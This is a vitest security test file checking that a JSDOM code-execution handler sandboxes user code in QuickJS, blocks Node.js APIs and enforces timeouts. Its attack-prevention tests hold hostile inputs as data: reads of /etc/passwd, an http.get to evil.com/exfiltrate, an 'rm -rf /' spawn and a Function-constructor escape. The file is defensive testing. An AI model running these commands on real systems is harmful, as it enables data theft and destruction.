/**
 * Security tests for browser_jsdom_execute isolation.
 *
 * CRIT-02 Fix: Ensures user code is executed in QuickJS WASM sandbox
 * instead of JSDOM's window.eval(), preventing access to Node.js APIs.
 */

import { afterEach, describe, expect, it } from 'vitest';
import { parseJson } from '@tests/server/domains/shared/mock-factories';
import { JsdomHandlers } from '@server/domains/browser/handlers/jsdom-tools';

describe('JsdomHandlers - Security Isolation (CRIT-02)', () => {
  let handlers: JsdomHandlers | null = null;

  afterEach(() => {
    handlers?.closeAll();
    handlers = null;
  });

  async function setupSession(html = '<html><body><h1>Test</h1></body></html>') {
    handlers = new JsdomHandlers();
    const parsed = parseJson<{ sessionId: string }>(
      await handlers.handleJsdomParse({
        html,
        runScripts: 'outside-only',
      }),
    );
    return parsed.sessionId;
  }

  describe('Attack Prevention', () => {
    it('blocks access to process.exit()', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'process.exit(1)',
        }),
      );

      expect(result.success).toBe(false);
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toMatch(
        /'?process'? is not defined/i,
      );
    });

    it('blocks access to require()', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'require("fs").readFileSync("/etc/passwd")',
        }),
      );

      expect(result.success).toBe(false);
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toMatch(
        /'?require'? is not defined/i,
      );
    });

    it('blocks access to global.__dirname', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: '__dirname',
        }),
      );

      expect(result.success).toBe(false);
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toMatch(
        /'?__dirname'? is not defined/i,
      );
    });

    it('blocks filesystem access via Node.js APIs', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: `
            const fs = require('fs');
            fs.writeFileSync('/tmp/exploit.txt', 'pwned');
          `,
        }),
      );

      expect(result.success).toBe(false);
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toMatch(
        /'?require'? is not defined/i,
      );
    });

    it('blocks network access via Node.js APIs', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: `
            const http = require('http');
            http.get('http://evil.com/exfiltrate');
          `,
        }),
      );

      expect(result.success).toBe(false);
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toMatch(
        /'?require'? is not defined/i,
      );
    });

    it('blocks child_process spawn', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: `
            const { spawn } = require('child_process');
            spawn('rm', ['-rf', '/']);
          `,
        }),
      );

      expect(result.success).toBe(false);
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toMatch(
        /'?require'? is not defined/i,
      );
    });

    it('blocks import() dynamic imports', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'import("fs").then(fs => fs.readFileSync("/etc/passwd"))',
        }),
      );

      expect(result.success).toBe(false);
      // QuickJS may throw different errors for import()
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toMatch(
        /'?import'? is not defined|not supported|not alive/i,
      );
    });

    it('blocks constructor-based escape via Function', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: '(function(){}).constructor("return process")().exit()',
        }),
      );

      // QuickJS sandbox should either block Function constructor or isolate it
      expect(result.success).toBe(false);
    });

    it('blocks prototype pollution attempts', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; result?: unknown }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: `
            Object.prototype.polluted = 'evil';
            ({}).polluted;
          `,
        }),
      );

      // Code should execute but pollution should not escape sandbox
      expect(result.success).toBe(true);
      expect(result.result).toBe('evil');

      // Verify host is not polluted
      const clean = {} as Record<string, unknown>;
      expect(clean['polluted']).toBeUndefined();
    });
  });

  describe('Legitimate Code Execution', () => {
    it('executes basic arithmetic', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; result?: unknown }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: '1 + 2 * 3',
        }),
      );

      expect(result.success).toBe(true);
      expect(result.result).toBe(7);
    });

    it('executes string manipulation', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; result?: unknown }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: '"hello".toUpperCase() + " world"',
        }),
      );

      expect(result.success).toBe(true);
      expect(result.result).toBe('HELLO world');
    });

    it('executes array operations', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; result?: unknown }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: '[1,2,3].map(x => x * 2).filter(x => x > 2)',
        }),
      );

      expect(result.success).toBe(true);
      expect(result.result).toEqual([4, 6]);
    });

    it('executes JSON operations', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; result?: unknown }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'JSON.parse(JSON.stringify({a: 1, b: [2, 3]}))',
        }),
      );

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ a: 1, b: [2, 3] });
    });

    it('captures console.log output', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; consoleLogs?: Array<unknown> }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'console.log("test", 123); "result"',
        }),
      );

      expect(result.success).toBe(true);
      expect(result.consoleLogs).toBeDefined();
      expect(result.consoleLogs!.length).toBeGreaterThan(0);
    });

    it('returns complex objects', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; result?: unknown }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: '({ nested: { value: 42 }, array: [1, 2, 3] })',
        }),
      );

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ nested: { value: 42 }, array: [1, 2, 3] });
    });

    it('handles errors gracefully', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'throw new Error("intentional error")',
        }),
      );

      expect(result.success).toBe(false);
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toContain('intentional error');
    });
  });

  describe('DOM Access from Sandbox', () => {
    it('provides read-only document properties', async () => {
      const sessionId = await setupSession(
        '<html><head><title>Test Page</title></head><body><h1 id="test">Title</h1></body></html>',
      );
      const result = parseJson<{ success: boolean; result?: unknown }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'document.title',
        }),
      );

      expect(result.success).toBe(true);
      expect(result.result).toBe('Test Page');
    });

    it('provides read-only window properties', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; result?: unknown }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'typeof window',
        }),
      );

      expect(result.success).toBe(true);
      expect(result.result).toBe('object');
    });

    it('provides window.location properties', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; result?: unknown }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'window.location.href',
        }),
      );

      expect(result.success).toBe(true);
      expect(result.result).toBe('about:blank');
    });

    it('does not provide DOM query methods (security trade-off)', async () => {
      const sessionId = await setupSession('<html><body><div id="target"></div></body></html>');
      const result = parseJson<{
        success: boolean;
        error?: string;
        message?: string;
        result?: unknown;
      }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'typeof document.getElementById',
        }),
      );

      // DOM query methods are not available in the sandbox
      // Users should use browser_jsdom_query tool instead
      expect(result.success).toBe(true);
      expect(result.result).toBe('undefined');
    });
  });

  describe('Timeout Enforcement', () => {
    it('terminates infinite loops', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'while(true) {}',
          timeoutMs: 100,
        }),
      );

      expect(result.success).toBe(false);
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toMatch(/timeout|timed out/i);
    });

    it('terminates long-running computations', async () => {
      const sessionId = await setupSession();
      const result = parseJson<{ success: boolean; error?: string; message?: string }>(
        await handlers!.handleJsdomExecute({
          sessionId,
          code: 'let x = 0; for(let i = 0; i < 1e9; i++) x += i; x',
          timeoutMs: 50,
        }),
      );

      expect(result.success).toBe(false);
      expect(`${result.error ?? ''} ${result.message ?? ''}`).toMatch(/timeout|timed out/i);
    });
  });
});
